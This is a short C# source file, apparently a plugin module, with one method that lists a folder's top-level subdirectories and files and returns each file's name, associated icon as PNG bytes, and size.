using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal class GetFilesAndDirs
    {
        internal static Dictionary<ushort, List<object[]>> GetAllFilesAndDirs(string path)
        {
            Dictionary<ushort, List<object[]>> fileManager = new Dictionary<ushort, List<object[]>>
            {
                { 0, new List<object[]>() },
                { 1, new List<object[]>() }
            };
            try
            {
                foreach (string directory in Directory.GetDirectories(path, "*.*", SearchOption.TopDirectoryOnly))
                {
                    try
                    {
                        string nameDir = Path.GetFileName(directory);
                        fileManager[0].Add(new object[] { nameDir });
                    }
                    catch (Exception)
                    {
                    }
                }
                foreach (string file in Directory.GetFiles(path, "*.*", SearchOption.TopDirectoryOnly))
                {
                    string filePath = Path.GetFileName(file);
                    try
                    {
                        Icon i = Icon.ExtractAssociatedIcon(file);
                        MemoryStream stream = new MemoryStream();
                        Bitmap btm = i.ToBitmap();
                        btm.Save(stream, ImageFormat.Png);
                        FileInfo fileInfo = new FileInfo(file);
                        fileManager[1].Add(new object[] { filePath, stream.ToArray(), fileInfo.Length });
                    }
                    catch (Exception)
                    {
                    }
                }
            }
            catch (Exception)
            {
            }
            return fileManager;
        }
    }
}
